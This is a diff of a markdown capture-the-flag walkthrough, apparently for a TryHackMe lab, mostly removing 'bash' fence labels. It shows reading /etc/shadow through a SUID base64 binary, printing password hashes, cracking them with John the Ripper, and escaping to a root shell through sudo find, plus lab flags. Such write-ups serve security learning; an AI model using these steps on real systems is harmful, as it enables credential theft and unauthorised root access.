@@ -21,16 +21,14 @@ Password: Penny123
 
 Step 1: Let's log in first with those credentials using SSH.
 
-```bash
+```
 ssh leonard@10.201.25.99
 # password: Penny123
 ```
 
-````
-
 Now you should find a shell in your terminal.
 
-```bash
+```
 [leonard@ip-<THM_ip> ~]$
 ```
 
@@ -38,13 +36,13 @@ Then I try to see the file and folder with “ls,” but unfortunately, this “
 
 Then I try to see sudo persimmon for Leonard users with -
 
-```bash
+```
 sudo -l
 ```
 
 Res:
 
-```bash
+```
 We trust you have received the usual lecture from the local system.
 Administrator. It usually boils down to these three things:
 
@@ -57,13 +55,13 @@ Oops! Sudo permission denied.
 
 Then I decided to check the permissions for this user, and I ran this command to check:
 
-```bash
+```
 find / -perm -4000 2>/dev/null
 ```
 
 Result (sample from the box):
 
-```bash
+```
 /usr/bin/passwd
 ```
 
@@ -75,25 +73,25 @@ Then I try to see the content under missy and rootflag, but I don’t have permi
 
 Let's try to find the flag with base64.
 
-```bash
+```
 /usr/bin/base64 /home/missy/flag1.txt | /usr/bin/base64 -d
 ```
 
 Result:
 
-```bash
+```
 /usr/bin/base64: /home/missy/flag1.txt: No such file or directory
 ```
 
 Try rootflag:
 
-```bash
+```
 /usr/bin/base64 /home/rootflag/flag2.txt | /usr/bin/base64 -d
 ```
 
 Result:
 
-```bash
+```
 THM-168824782390238
 ```
 
@@ -101,25 +99,25 @@ WAHH! It's a miracle that, without getting root access, we can read flag2.txt, b
 
 Let’s try to see the /etc/shadow file to find Missy’s user password.
 
-```bash
+```
 cat /etc/shadow
 ```
 
 Result:
 
-```bash
+```
 Permission denied
 ```
 
 Let’s try using base64 to read this file –
 
-```bash
+```
 /usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
 ```
 
 Result:
 
-```bash
+```
 root:$6$DWBzMoiprTTJ4gbW$g0szmtfn3HYFQweUPpSUCgHXZLzVii5o6PM0Q2oMmaDD9oGUSxe1yvKbnYsaSYHrUEQXTjIwOW/yrzV5HtIL51::0:99999:7:::
 missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfwaD2JCUypk4HaNzI3rPVqKHb/:18785:0:99999:7:::
 ```
@@ -127,44 +125,44 @@ missy:$6$BjOlWE21$HwuDvV1iSiySCNpA3Z9LxkxQEqUAdZvObTxJxMoCp/9zRVCi6/zrlMlAQPAxfw
 We found that one password is the root user’s and one is Missy’s. Let’s crack them with John the Ripper.
 Save this to your local machine as “pass.txt” and then run these tools:
 
-```bash
+```
 john pass.txt --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 After some time, you should find Missy's user password.
 
-```bash
+```
 Password1        (missy)
 ```
 
 Now change the user Leonard to Missy.
 
-```bash
+```
 su Missy
 # password: Password1
 ```
 
 Now try to visit the /home/missy folder, then try to find the flag.
 
-```bash
+```
 find / -type f -name flag1.txt 2>/dev/null
 ```
 
 Result:
 
-```bash
+```
 /home/missy/Documents/flag1.txt
 ```
 
 I found the flag1.txt path; now try to read it.
 
-```bash
+```
 cat /home/missy/Documents/flag1.txt
 ```
 
 Result:
 
-```bash
+```
 THM-42828719920544
 ```
 
@@ -172,13 +170,13 @@ Yeah, I also found flag1. But I still can't get access to the rootflag folder. I
 
 Now i try to see the sudo permission for missy user -
 
-```bash
+```
 sudo -l
 ```
 
 Unfortunately I found a valuable response -
 
-```bash
+```
 (ALL) NOPASSWD: /usr/bin/find
 ```
 
@@ -186,24 +184,23 @@ Then I am not trying to see others way like (path, SUID, capabilities)
 
 With find i search into gtfobins.github.io to find the exploit -
 
-```bash
+```
 sudo find . -exec /bin/sh \; -quit
 ```
 
 Then:
 
-```bash
+```
 cd rootflag
 cat flag2.txt
 ```
 
 Result:
 
-```bash
+```
 THM-168824782390238
 ```
 
 Again we got the flag and finally we completed the normal user to root user accessing process.
 
----
-````
+--- THE END ---
